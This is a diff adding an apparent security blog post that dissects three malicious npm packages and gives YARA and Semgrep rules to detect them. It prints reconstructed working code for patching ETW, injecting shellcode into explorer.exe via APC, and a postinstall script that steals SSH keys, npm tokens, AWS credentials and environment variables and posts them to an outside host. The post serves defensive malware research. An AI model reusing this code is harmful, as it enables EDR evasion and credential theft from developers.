@@ -1,0 +1,434 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Anatomy of an npm Supply Chain Attack — CyberWillow</title>
+  <link rel="stylesheet" href="../style.css">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=DM+Serif+Display:ital@0;1&family=IBM+Plex+Mono:wght@400;500;600&family=Source+Sans+3:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+</head>
+<body>
+
+  <!-- ═══════════════ NAVIGATION ═══════════════ -->
+  <nav class="nav">
+    <div class="nav__inner">
+      <a href="/" class="nav__brand">
+        <span class="nav__icon">
+          <svg viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <path d="M16 2C16 2 8 8 8 16C8 20.4 11.6 24 16 24C20.4 24 24 20.4 24 16C24 8 16 2 16 2Z" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+            <path d="M16 2V24" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"/>
+            <path d="M10 12C12 14 14 15 16 15C18 15 20 14 22 12" stroke="currentColor" stroke-width="1" stroke-linecap="round" opacity="0.5"/>
+            <path d="M9 18C11.5 16 13.5 15.5 16 15.5C18.5 15.5 20.5 16 23 18" stroke="currentColor" stroke-width="1" stroke-linecap="round" opacity="0.5"/>
+            <circle cx="16" cy="28" r="2" stroke="currentColor" stroke-width="1.5"/>
+          </svg>
+        </span>
+        <span class="nav__name">CyberWillow</span>
+      </a>
+      <div class="nav__links">
+        <a href="/" class="nav__link">Blog</a>
+        <a href="/about.html" class="nav__link">About</a>
+        <a href="https://github.com/cyberwillow" class="nav__link nav__link--ext" target="_blank" rel="noopener">
+          GitHub
+          <svg width="10" height="10" viewBox="0 0 10 10" fill="none"><path d="M1 9L9 1M9 1H3M9 1V7" stroke="currentColor" stroke-width="1.2"/></svg>
+        </a>
+      </div>
+      <button class="nav__toggle" aria-label="Menu" onclick="document.body.classList.toggle('menu-open')">
+        <span></span><span></span>
+      </button>
+    </div>
+  </nav>
+
+  <!-- ═══════════════ POST HEADER ═══════════════ -->
+  <header class="post-header">
+    <div class="post-header__inner">
+      <a href="/" class="post-header__back">
+        <svg width="16" height="16" viewBox="0 0 16 16" fill="none"><path d="M10 12L6 8L10 4" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg>
+        All posts
+      </a>
+      <div class="post-header__meta">
+        <time class="post-header__date" datetime="2026-04-04">April 4, 2026</time>
+        <span class="post-header__sep">·</span>
+        <span class="post-header__read">12 min read</span>
+      </div>
+      <span class="post__tag post__tag--threat">Threat Research</span>
+      <h1 class="post-header__title">Anatomy of an npm Supply Chain Attack: Dissecting Malicious Packages in the Wild</h1>
+      <p class="post-header__subtitle">
+        A deep technical walkthrough of three malicious npm packages — from initial discovery
+        through behavioral analysis, obfuscation techniques, and the YARA rules that catch them.
+      </p>
+      <div class="post__topics">
+        <span>npm</span>
+        <span>supply chain</span>
+        <span>malware analysis</span>
+        <span>YARA</span>
+      </div>
+    </div>
+  </header>
+
+  <!-- ═══════════════ POST BODY ═══════════════ -->
+  <main class="post-content">
+    <article class="post-body">
+
+      <p>
+        The npm registry publishes roughly 800,000 new package versions per month. Security teams scan a fraction of them. Attackers know this, and they've gotten good at slipping through — sometimes for weeks before anyone notices. Over the past several months I've been analyzing malicious packages pulled from npm, and three techniques keep surfacing: ETW patching to blind endpoint detection, APC injection for code execution, and systematic credential harvesting. This post walks through each one in detail, with the YARA rules I've written to detect them.
+      </p>
+
+      <div class="callout callout--warn">
+        <strong>Disclaimer</strong>
+        Code samples below are stripped and modified versions of real malicious packages. Package names and exfiltration endpoints have been redacted. Do not run these.
+      </div>
+
+      <h2>How These Packages Get Discovered</h2>
+
+      <p>
+        Most malicious npm packages fall into a few categories: typosquats of popular packages (<code>lodahs</code> for <code>lodash</code>, <code>crossenv</code> for <code>cross-env</code>), dependency confusion attacks targeting internal package names, and compromised maintainer accounts publishing backdoored versions of legitimate packages.
+      </p>
+      <p>
+        My analysis pipeline starts with automated scanning of new npm publishes using a combination of static analysis (OpenGrep/Semgrep rules targeting install-time script patterns) and behavioral sandboxing. Packages that trip rules get queued for manual review. The three packages in this post were flagged by rules watching for <code>preinstall</code>/<code>postinstall</code> hooks that make outbound network calls or read from <code>~/.ssh</code>.
+      </p>
+
+      <h2>Technique 1: ETW Patching</h2>
+
+      <p>
+        Event Tracing for Windows (ETW) is the logging substrate that most EDR products depend on. When an EDR vendor wants to observe API calls like <code>NtCreateProcess</code>, <code>VirtualAllocEx</code>, or <code>WriteProcessMemory</code>, they register an ETW consumer and subscribe to the Microsoft-Windows-Threat-Intelligence provider. Blind that provider, and you blind the EDR.
+      </p>
+      <p>
+        The first package I analyzed shipped a native Node.js addon — a <code>.node</code> file compiled from C++ via <code>node-gyp</code>. The addon's sole purpose was to patch <code>ntdll!EtwEventWrite</code> in the current process, replacing the first bytes of the function with a <code>ret 0</code> instruction. Any ETW events the Node process subsequently tried to emit would silently do nothing.
+      </p>
+
+      <pre><code>// Reconstructed from decompiled native addon
+// Patches EtwEventWrite to return immediately
+BOOL patch_etw() {
+    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
+    if (!ntdll) return FALSE;
+
+    FARPROC etw_write = GetProcAddress(ntdll, "EtwEventWrite");
+    if (!etw_write) return FALSE;
+
+    DWORD old_protect;
+    // Make the page writable
+    VirtualProtect(etw_write, 4, PAGE_EXECUTE_READWRITE, &old_protect);
+
+    // Write: mov eax, 0; ret  (32-bit equivalent on 64-bit via WOW64 thunk)
+    // On 64-bit: xor rax, rax; ret
+    unsigned char patch[] = { 0x48, 0x31, 0xC0, 0xC3 };
+    memcpy(etw_write, patch, sizeof(patch));
+
+    VirtualProtect(etw_write, 4, old_protect, &old_protect);
+    return TRUE;
+}</code></pre>
+
+      <p>
+        From JavaScript, the package called the addon via the standard <code>require('./build/Release/addon.node')</code> path. The <code>binding.gyp</code> was obfuscated with a generic-looking build target name and the source was split across multiple files to avoid simple grep-based detections.
+      </p>
+
+      <div class="callout callout--info">
+        <strong>Why this matters</strong>
+        Once ETW is patched, subsequent API calls from that process — including any shellcode execution — may not be logged by EDR. This is particularly dangerous in CI/CD pipelines where <code>npm install</code> runs in an elevated or broadly-scoped service account context.
+      </div>
+
+      <h3>Detection: ETW Patch YARA Rule</h3>
+
+      <p>
+        The patch sequence is distinctive. A YARA rule targeting the byte pattern alongside the <code>EtwEventWrite</code> string catches this variant and most derivatives I've seen:
+      </p>
+
+      <pre><code>rule npm_etw_patch_native_addon
+{
+    meta:
+        description = "Detects ETW patching pattern in compiled Node.js native addons"
+        author      = "hunter@cyberwillow"
+        date        = "2026-03-15"
+        reference   = "CyberWillow supply chain research"
+
+    strings:
+        $etw_func    = "EtwEventWrite" ascii wide
+        $patch_xor   = { 48 31 C0 C3 }          // xor rax,rax; ret
+        $patch_mov   = { B8 00 00 00 00 C3 }     // mov eax,0; ret
+        $vprotect    = "VirtualProtect" ascii wide
+        $get_proc    = "GetProcAddress" ascii wide
+
+    condition:
+        uint16(0) == 0x5A4D and        // PE header
+        filesize < 500KB and
+        $etw_func and
+        ($patch_xor or $patch_mov) and
+        $vprotect and $get_proc
+}</code></pre>
+
+      <h2>Technique 2: APC Injection</h2>
+
+      <p>
+        The second package took a different approach to execution. Rather than running malicious code directly in the Node.js process, it injected a shellcode payload into a legitimate Windows process via Asynchronous Procedure Calls (APCs). The target was <code>explorer.exe</code>, chosen for its near-universal presence and low baseline alert rate.
+      </p>
+      <p>
+        The APC injection chain looks like this: the native addon opens a handle to the target process, allocates a RWX memory region, writes shellcode into it, then calls <code>QueueUserAPC</code> on one of the target's alertable threads. When that thread enters an alertable wait state — which <code>explorer.exe</code> threads do constantly — Windows dispatches the APC and executes the shellcode.
+      </p>
+
+      <pre><code>// Reconstructed APC injection chain from native addon
+BOOL inject_via_apc(DWORD target_pid, unsigned char* shellcode, size_t sc_len) {
+    HANDLE hProcess = OpenProcess(
+        PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION |
+        PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION,
+        FALSE, target_pid
+    );
+    if (!hProcess) return FALSE;
+
+    // Allocate RWX page in target process
+    LPVOID remote_buf = VirtualAllocEx(
+        hProcess, NULL, sc_len,
+        MEM_COMMIT | MEM_RESERVE,
+        PAGE_EXECUTE_READWRITE
+    );
+
+    // Write shellcode
+    SIZE_T written;
+    WriteProcessMemory(hProcess, remote_buf, shellcode, sc_len, &written);
+
+    // Enumerate threads and queue APC on each alertable one
+    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+    THREADENTRY32 te = { sizeof(te) };
+
+    if (Thread32First(hSnapshot, &te)) {
+        do {
+            if (te.th32OwnerProcessID == target_pid) {
+                HANDLE hThread = OpenThread(
+                    THREAD_SET_CONTEXT, FALSE, te.th32ThreadID
+                );
+                if (hThread) {
+                    QueueUserAPC((PAPCFUNC)remote_buf, hThread, 0);
+                    CloseHandle(hThread);
+                }
+            }
+        } while (Thread32Next(hSnapshot, &te));
+    }
+
+    CloseHandle(hSnapshot);
+    CloseHandle(hProcess);
+    return TRUE;
+}</code></pre>
+
+      <p>
+        The shellcode payload itself was a staged loader — a small blob that fetched a second-stage payload over HTTPS and executed it in memory. The staging approach keeps the initial npm package small and the first stage payload appears as generic HTTPS traffic.
+      </p>
+
+      <h3>Detection: APC Injection YARA Rule</h3>
+
+      <pre><code>rule npm_apc_process_injection
+{
+    meta:
+        description = "Detects APC injection pattern in Node.js native addons"
+        author      = "hunter@cyberwillow"
+        date        = "2026-03-15"
+
+    strings:
+        $queueapc    = "QueueUserAPC" ascii wide
+        $valloc      = "VirtualAllocEx" ascii wide
+        $writeprocmem = "WriteProcessMemory" ascii wide
+        $openproc    = "OpenProcess" ascii wide
+        $snapshot    = "CreateToolhelp32Snapshot" ascii wide
+        // RWX allocation constant (0x40 = PAGE_EXECUTE_READWRITE)
+        $rwx_const   = { 40 00 00 00 }
+
+    condition:
+        uint16(0) == 0x5A4D and
+        filesize < 2MB and
+        $queueapc and
+        $valloc and
+        $writeprocmem and
+        $openproc and
+        $snapshot
+}</code></pre>
+
+      <h2>Technique 3: Credential Harvesting and Exfiltration</h2>
+
+      <p>
+        The third package was the most immediately impactful. No native code, no process injection — just a <code>postinstall</code> script in pure JavaScript that systematically harvested credentials from the developer's machine and exfiltrated them over HTTPS within seconds of <code>npm install</code> completing.
+      </p>
+
+      <h3>What it harvested</h3>
+
+      <p>The exfiltration script targeted six credential sources:</p>
+      <ul>
+        <li><strong>Environment variables</strong> — <code>process.env</code> dumped in full. Cloud provider keys (<code>AWS_ACCESS_KEY_ID</code>, <code>AZURE_CLIENT_SECRET</code>), CI tokens, and database URLs all live here.</li>
+        <li><strong>SSH private keys</strong> — recursive read of <code>~/.ssh/</code>, grabbing every file that doesn't end in <code>.pub</code></li>
+        <li><strong>npm auth token</strong> — <code>~/.npmrc</code>, which stores the <code>//registry.npmjs.org/:_authToken</code> used to publish packages</li>
+        <li><strong>Git credentials</strong> — <code>~/.gitconfig</code> and the system credential store via <code>git credential fill</code></li>
+        <li><strong>AWS credentials file</strong> — <code>~/.aws/credentials</code> and <code>~/.aws/config</code></li>
+        <li><strong>Shell history</strong> — <code>~/.bash_history</code> and <code>~/.zsh_history</code>, which often contain secrets typed on the command line</li>
+      </ul>
+
+      <pre><code>// Reconstructed exfiltration logic (obfuscated in original)
+const os   = require('os');
+const fs   = require('fs');
+const path = require('path');
+const http = require('https');
+
+function harvest() {
+    const home = os.homedir();
+    const payload = {};
+
+    // Environment
+    payload.env = process.env;
+
+    // SSH keys
+    const sshDir = path.join(home, '.ssh');
+    if (fs.existsSync(sshDir)) {
+        payload.ssh = {};
+        fs.readdirSync(sshDir).forEach(f => {
+            if (!f.endsWith('.pub') && !f.endsWith('known_hosts')) {
+                try {
+                    payload.ssh[f] = fs.readFileSync(
+                        path.join(sshDir, f), 'utf8'
+                    );
+                } catch (_) {}
+            }
+        });
+    }
+
+    // npm token
+    const npmrc = path.join(home, '.npmrc');
+    if (fs.existsSync(npmrc)) {
+        payload.npmrc = fs.readFileSync(npmrc, 'utf8');
+    }
+
+    // AWS credentials
+    const awsCreds = path.join(home, '.aws', 'credentials');
+    if (fs.existsSync(awsCreds)) {
+        payload.aws = fs.readFileSync(awsCreds, 'utf8');
+    }
+
+    exfiltrate(payload);
+}
+
+function exfiltrate(data) {
+    const body = Buffer.from(JSON.stringify(data)).toString('base64');
+    const req  = http.request({
+        hostname : '[REDACTED].requestcatcher.com',
+        path     : '/collect',
+        method   : 'POST',
+        headers  : { 'Content-Type': 'application/json' }
+    });
+    req.write(JSON.stringify({ d: body }));
+    req.end();
+}
+
+harvest();</code></pre>
+
+      <h3>Obfuscation layers</h3>
+
+      <p>
+        The original script wasn't this readable. It used three layers of obfuscation: string splitting (<code>'pro' + 'cess'</code>), hex escape sequences for sensitive identifiers, and dynamic property access via computed keys. None of it defeats a determined analyst, but it's enough to pass automated scanners that do simple string matching.
+      </p>
+      <p>
+        The package also had a legitimate-looking primary export — a small utility function — so a developer scanning the API surface wouldn't see anything suspicious. The malicious code ran only during install, not during import.
+      </p>
+
+      <h3>Detection: Credential Harvesting YARA Rule</h3>
+
+      <pre><code>rule npm_credential_harvester_js
+{
+    meta:
+        description = "Detects JavaScript credential harvesting patterns in npm packages"
+        author      = "hunter@cyberwillow"
+        date        = "2026-03-20"
+
+    strings:
+        // Credential source patterns
+        $ssh_path    = ".ssh" ascii
+        $npmrc       = ".npmrc" ascii
+        $aws_creds   = ".aws/credentials" ascii nocase
+        $proc_env    = "process.env" ascii
+
+        // Exfiltration indicators
+        $http_req    = "http.request" ascii
+        $https_req   = "https.request" ascii
+        $base64_enc  = "toString('base64')" ascii
+        $json_str    = "JSON.stringify" ascii
+
+        // Execution context (install-time)
+        $postinstall = "postinstall" ascii
+        $preinstall  = "preinstall" ascii
+
+    condition:
+        // Must match multiple credential sources AND exfil method
+        (
+            (#ssh_path > 0 or #npmrc > 0 or #aws_creds > 0) and
+            $proc_env
+        ) and
+        ($http_req or $https_req) and
+        ($base64_enc or $json_str)
+}</code></pre>
+
+      <h2>Semgrep Rules for Static Analysis</h2>
+
+      <p>
+        YARA is great for binary and installed artifact scanning, but Semgrep works better during the CI/CD phase — scanning source before it's ever installed. Here's a rule I use to flag packages that read credential paths and make network calls in the same file:
+      </p>
+
+      <pre><code># semgrep rule: npm-supply-chain-credential-read-and-exfil.yaml
+rules:
+  - id: npm-install-script-reads-credentials-and-exfils
+    patterns:
+      - pattern-either:
+          - pattern: fs.readFileSync(path.join(os.homedir(), ".ssh", ...))
+          - pattern: fs.readFileSync(path.join(os.homedir(), ".npmrc"))
+          - pattern: fs.readFileSync(path.join(os.homedir(), ".aws", ...))
+      - pattern-either:
+          - pattern: https.request(...)
+          - pattern: http.request(...)
+          - pattern: fetch(...)
+    message: >
+      Package reads sensitive credential paths and makes outbound network
+      calls. This pattern is characteristic of supply chain credential
+      harvesting. Review this code carefully before installing.
+    languages: [javascript]
+    severity: ERROR
+    metadata:
+      category: security
+      cwe: CWE-312</code></pre>
+
+      <h2>Conclusion</h2>
+
+      <p>
+        These three packages illustrate how supply chain attackers operate on a spectrum of sophistication — from a trivial <code>postinstall</code> credential dump to a multi-stage native addon that patches ETW before injecting shellcode. What they share is an exploitation of developer trust: developers run <code>npm install</code> the same way they open email attachments, because it's always been fine until it isn't.
+      </p>
+      <p>
+        A few things you can do right now: audit your <code>package.json</code> install scripts, enforce <code>--ignore-scripts</code> in CI pipelines where you don't need them, run npm installs in sandboxed environments without access to <code>~/.ssh</code> and <code>~/.aws</code>, and deploy YARA scanning against your artifact registry. None of these are perfect — a motivated attacker will find a way around them — but they raise the cost significantly.
+      </p>
+      <p>
+        The YARA and Semgrep rules above are available in my <a href="https://github.com/cyberwillow" class="about__inline-link">GitHub repository</a> along with the full rule set I've built from this research.
+      </p>
+
+    </article>
+  </main>
+
+  <!-- ═══════════════ POST FOOTER NAV ═══════════════ -->
+  <div class="post-nav">
+    <div class="post-nav__inner">
+      <a href="/posts/ad-persistence-detection.html" class="post-nav__link post-nav__link--prev">
+        <span class="post-nav__label">← Previous</span>
+        <span class="post-nav__title">Building Resilient Detections for Active Directory Persistence</span>
+      </a>
+      <a href="/" class="post-nav__link post-nav__link--home">
+        <span class="post-nav__label">← Back to all posts</span>
+      </a>
+    </div>
+  </div>
+
+  <!-- ═══════════════ FOOTER ═══════════════ -->
+  <footer class="footer">
+    <div class="footer__inner">
+      <p class="footer__copy">&copy; 2026 CyberWillow. Built with intention.</p>
+      <div class="footer__links">
+        <a href="/rss.xml">RSS</a>
+        <a href="https://github.com/cyberwillow" target="_blank" rel="noopener">GitHub</a>
+        <a href="https://linkedin.com" target="_blank" rel="noopener">LinkedIn</a>
+      </div>
+    </div>
+  </footer>
+
+</body>
+</html>
